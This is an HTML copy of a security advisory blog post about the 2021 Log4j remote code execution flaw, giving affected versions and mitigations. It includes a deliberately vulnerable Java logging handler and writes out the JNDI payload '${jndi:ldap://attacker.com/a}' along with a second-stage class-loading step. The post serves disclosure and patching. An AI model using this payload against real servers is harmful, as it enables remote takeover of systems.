<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Original</a>
    <h1>Log4j RCE Found</h1>
    
    <div id="readability-page-1" class="page"><div itemprop="articleBody"><p>A few hours ago, a 0-day exploit in the
popular Java logging library, <code>log4j</code>, was <a href="https://twitter.com/P0rZ9/status/1468949890571337731" target="_blank" rel="noopener noreferrer">tweeted</a> along with a POC posted on
<a href="https://github.com/tangxiaofeng7/apache-log4j-poc" target="_blank" rel="noopener noreferrer">GitHub</a> that results in Remote Code Execution (RCE) if
<code>log4j</code> logs an attacker-controlled string value.</p><p>Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
the impact of this vulnerability is quite severe. Since this vulnerability is still very new, there isn&#39;t a CVE to track
it yet.</p><p>This post provides resources to help you understand the vulnerability and how to mitigate it for yourself.</p><h2 id="who-is-impacted">Who is impacted?<a aria-hidden="true" href="#who-is-impacted" title="Direct link to heading">​</a></h2><p>Cloud services like <a href="https://news.ycombinator.com/item?id=29499867" target="_blank" rel="noopener noreferrer">Steam, Apple iCloud</a>, and apps like
Minecraft have been found to be vulnerable to this exploit. Many, many others likely are, also.</p><p>Anybody using Apache Struts is likely vulnerable. We&#39;ve seen similar vulnerabilities exploited before in breaches like
the <a href="https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach" target="_blank" rel="noopener noreferrer">2017 Equifax data breach</a>.</p><p>Many Open Source projects
like the Minecraft server, <a href="https://github.com/PaperMC/Paper/commit/b475c6a683fa34156b964f751985f36a784ca0e0" target="_blank" rel="noopener noreferrer">Paper</a>,
have already begun patching their usage of <code>log4j</code>.</p><h2 id="affected-apache-log4j-versions">Affected Apache log4j Versions<a aria-hidden="true" href="#affected-apache-log4j-versions" title="Direct link to heading">​</a></h2><p><code>2.0 &lt;= Apache log4j &lt;= 2.14.1</code></p><p>At the time this post was created (December 9th, 2021) a patch is available in <code>log4j-2.15.0-rc1</code>
<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1" target="_blank" rel="noopener noreferrer">here</a>.</p><h2 id="temporary-mitigation">Temporary Mitigation<a aria-hidden="true" href="#temporary-mitigation" title="Direct link to heading">​</a></h2><p>Start your server with <code>log4j2.formatMsgNoLookups</code> set to <code>true</code>, or update to <code>log4j-2.15.0-rc1</code> or later.
(Kudos to @80vul for <a href="https://twitter.com/80vul/status/1468968891489857537" target="_blank" rel="noopener noreferrer">tweeting</a>)</p><h2 id="how-the-exploit-works">How the exploit works<a aria-hidden="true" href="#how-the-exploit-works" title="Direct link to heading">​</a></h2><h3 id="exploit-requirements">Exploit Requirements<a aria-hidden="true" href="#exploit-requirements" title="Direct link to heading">​</a></h3><ul><li>A server running with a vulnerable <code>log4j</code> version (listed above),</li><li>A remotely accessible endpoint with any protocol (HTTP, TCP, etc) that allows an attacker to send arbitrary data,</li><li>A log statement in the endpoint that logs the attacker controlled data.</li></ul><h3 id="example-vulnerable-code">Example Vulnerable Code<a aria-hidden="true" href="#example-vulnerable-code" title="Direct link to heading">​</a></h3><div><div><pre tabindex="0"><code><span><span>import org.apache.log4j.Logger;</span><br/></span><span><span></span><br/></span><span><span>import java.io.*;</span><br/></span><span><span>import java.sql.SQLException;</span><br/></span><span><span>import java.util.*;</span><br/></span><span><span></span><br/></span><span><span>public class VulnerableLog4jExampleHandler implements HttpHandler {</span><br/></span><span><span></span><br/></span><span><span>  static Logger log = Logger.getLogger(log4jExample.class.getName());</span><br/></span><span><span></span><br/></span><span><span>  /**</span><br/></span><span><span>   * A simple HTTP endpoint that reads the request&#39;s User Agent and logs it back.</span><br/></span><span><span>   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span><br/></span><span><span>   * @param he HTTP Request Object</span><br/></span><span><span>   */</span><br/></span><span><span>  public void handle(HttpExchange he) throws IOException {</span><br/></span><span><span>    string userAgent = he.getRequestHeader(&#34;user-agent&#34;);</span><br/></span><span><span>    </span><br/></span><span><span>    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span><br/></span><span><span>    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}</span><br/></span><span><span>    log.info(&#34;Request User Agent:&#34; + userAgent);</span><br/></span><span><span></span><br/></span><span><span>    String response = &#34;&lt;h1&gt;Hello There, &#34; + userAgent + &#34;!&lt;/h1&gt;&#34;;</span><br/></span><span><span>    he.sendResponseHeaders(200, response.length());</span><br/></span><span><span>    OutputStream os = he.getResponseBody();</span><br/></span><span><span>    os.write(response.getBytes());</span><br/></span><span><span>    os.close();</span><br/></span><span><span>  }</span><br/></span><span><span>}</span><br/></span></code></pre></div></div><h3 id="exploit-steps">Exploit Steps<a aria-hidden="true" href="#exploit-steps" title="Direct link to heading">​</a></h3><ol><li>Data from the User gets sent to the server (via any protocol),</li><li>The server logs the data in the request, containing the malicious payload: <code>${jndi:ldap://attacker.com/a}</code> (where <code>attacker.com</code> is an attacker controlled server),</li><li>The <code>log4j</code> vulnerability is triggered by this payload and the server makes a request to <code>attacker.com</code> via &#34;<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener noreferrer">Java Naming and Directory Interface</a>&#34; (JNDI),</li><li>This response contains a path to a remote Java class file (ex. <code>http://second-stage.attacker.com/Exploit.class</code>) which is injected into the server process,</li><li>This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.</li></ol><p>Due to how common Java vulnerabilities such as these are, security researchers have created tools to easily exploit
them. The <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer">marshalsec</a> project is one of many that demonstrates generating an
exploit payload that could be used for this vulnerability. You can refer to <a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener noreferrer">this malicious LDAP server</a> for an example of exploitation. </p><h2 id="more-information">More information<a aria-hidden="true" href="#more-information" title="Direct link to heading">​</a></h2><p>We&#39;ll continue to update this post as information about the impact of this exploit becomes available.</p><p>For now, we&#39;re just publishing this to help raise awareness and get people patching it. Please tell any of your friends
running Java software!</p></div></div>
  </body>
</html>
